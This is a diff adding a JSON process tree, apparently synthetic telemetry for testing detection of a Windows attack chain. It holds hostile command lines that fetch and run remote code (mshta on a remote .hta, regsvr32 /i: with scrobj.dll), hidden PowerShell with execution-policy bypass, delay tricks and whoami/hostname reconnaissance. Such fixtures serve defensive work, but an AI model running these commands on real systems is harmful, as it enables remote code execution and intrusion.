@@ -1,0 +1,228 @@
+{
+  "pid": 217356,
+  "ppid": 0,
+  "name": "scriptlauncher.exe",
+  "command": "scriptlauncher.exe /session",
+  "children": [
+    {
+      "pid": 217362,
+      "ppid": 217356,
+      "name": "cscript.exe",
+      "command": "cscript.exe //nologo \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\Diag_79d66fb0.wsf\" /apply",
+      "children": [
+        {
+          "pid": 217368,
+          "ppid": 217362,
+          "name": "ping.exe",
+          "command": "ping.exe -n 17 127.0.0.1 > nul",
+          "children": [
+            {
+              "pid": 217375,
+              "ppid": 217368,
+              "name": "mshta.exe",
+              "command": "mshta.exe \"http://bldsrv.corp.local/pkg/postreg.hta\"",
+              "children": [
+                {
+                  "pid": 217379,
+                  "ppid": 217375,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": [
+                    {
+                      "pid": 217381,
+                      "ppid": 217379,
+                      "name": "ping.exe",
+                      "command": "ping.exe -n 25 127.0.0.1 > nul",
+                      "children": []
+                    }
+                  ]
+                },
+                {
+                  "pid": 217387,
+                  "ppid": 217375,
+                  "name": "ping.exe",
+                  "command": "ping.exe -n 19 127.0.0.1 > nul",
+                  "children": [
+                    {
+                      "pid": 217390,
+                      "ppid": 217387,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_43f69559.txt\"",
+                      "children": [
+                        {
+                          "pid": 217393,
+                          "ppid": 217390,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe /priv > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_43ee3a71.txt\"",
+                          "children": [
+                            {
+                              "pid": 217395,
+                              "ppid": 217393,
+                              "name": "timeout.exe",
+                              "command": "timeout.exe /t 24 /nobreak",
+                              "children": [
+                                {
+                                  "pid": 217401,
+                                  "ppid": 217395,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\host_31291cd9.txt\"",
+                                  "children": []
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 217408,
+                      "ppid": 217387,
+                      "name": "choice.exe",
+                      "command": "choice.exe /d y /t 21 > nul",
+                      "children": [
+                        {
+                          "pid": 217413,
+                          "ppid": 217408,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe",
+                          "children": [
+                            {
+                              "pid": 217417,
+                              "ppid": 217413,
+                              "name": "regsvr32.exe",
+                              "command": "regsvr32.exe /s /n /u /i:\"http://helpdesk-tools.corp.local/ops/verify.ps1\" scrobj.dll",
+                              "children": [
+                                {
+                                  "pid": 217421,
+                                  "ppid": 217417,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe /all",
+                                  "children": [
+                                    {
+                                      "pid": 217425,
+                                      "ppid": 217421,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /all",
+                                      "children": [
+                                        {
+                                          "pid": 217439,
+                                          "ppid": 217425,
+                                          "name": "findstr.exe",
+                                          "command": "findstr.exe /i \"ERROR\" \"C:\\ProgramData\\Contoso\\Logs\\support.log\"",
+                                          "children": [
+                                            {
+                                              "pid": 217443,
+                                              "ppid": 217439,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 217445,
+                                                  "ppid": 217443,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": [
+                                                    {
+                                                      "pid": 217449,
+                                                      "ppid": 217445,
+                                                      "name": "whoami.exe",
+                                                      "command": "whoami.exe > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_418ca175.txt\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 217451,
+                                                          "ppid": 217449,
+                                                          "name": "powershell.exe",
+                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Get-ScheduledTask | Out-File 'C:\\Users\\aditya.das\\AppData\\Local\\Temp\\diag_93ece7d5.txt'\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 217458,
+                                                              "ppid": 217451,
+                                                              "name": "timeout.exe",
+                                                              "command": "timeout.exe /t 2 /nobreak",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 217462,
+                                                                  "ppid": 217458,
+                                                                  "name": "whoami.exe",
+                                                                  "command": "whoami.exe /groups > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_95a8e408.txt\"",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 217469,
+                                                                      "ppid": 217462,
+                                                                      "name": "choice.exe",
+                                                                      "command": "choice.exe /d y /t 4 > nul",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 217472,
+                                                                          "ppid": 217469,
+                                                                          "name": "ping.exe",
+                                                                          "command": "ping.exe -n 18 127.0.0.1 > nul",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 217474,
+                                                                              "ppid": 217472,
+                                                                              "name": "whoami.exe",
+                                                                              "command": "whoami.exe > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_9effe67f.txt\"",
+                                                                              "children": []
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 217426,
+      "ppid": 217356,
+      "name": "whoami.exe",
+      "command": "whoami.exe /all > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_3842d72a.txt\"",
+      "children": [
+        {
+          "pid": 217431,
+          "ppid": 217426,
+          "name": "whoami.exe",
+          "command": "whoami.exe /priv",
+          "children": [
+            {
+              "pid": 217436,
+              "ppid": 217431,
+              "name": "whoami.exe",
+              "command": "whoami.exe /all > \"C:\\Users\\aditya.das\\AppData\\Local\\Temp\\who_8e5cefb8.txt\"",
+              "children": []
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
